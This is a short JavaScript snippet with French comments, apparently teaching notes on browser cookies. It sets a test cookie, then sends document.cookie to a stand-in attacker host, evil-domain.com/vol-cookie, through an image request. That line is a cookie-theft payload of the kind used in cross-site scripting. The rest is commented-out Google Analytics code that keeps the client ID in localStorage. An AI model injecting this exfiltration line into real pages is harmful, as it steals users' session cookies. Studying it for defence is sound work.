document.cookie = "test=salut; Domain=";
new Image().src =
  "http://www.evil-domain.com/vol-cookie?cookie=" + document.cookie;

//Google Analytics propose quand même optionnellement d'utiliser le localStorage pour les cookies, voici le code officiel :
// var GA_LOCAL_STORAGE_KEY = 'ga:clientId';

// if (window.localStorage) {
//   ga('create', 'UA-XXXXX-Y', {
//     'storage': 'none',
//     'clientId': localStorage.getItem(GA_LOCAL_STORAGE_KEY)
//   });
//   ga(function(tracker) {
//     localStorage.setItem(GA_LOCAL_STORAGE_KEY, tracker.get('clientId'));
//   });
// }
// else {
//   ga('create', 'UA-XXXXX-Y', 'auto');
// }

// ga('send', 'pageview');
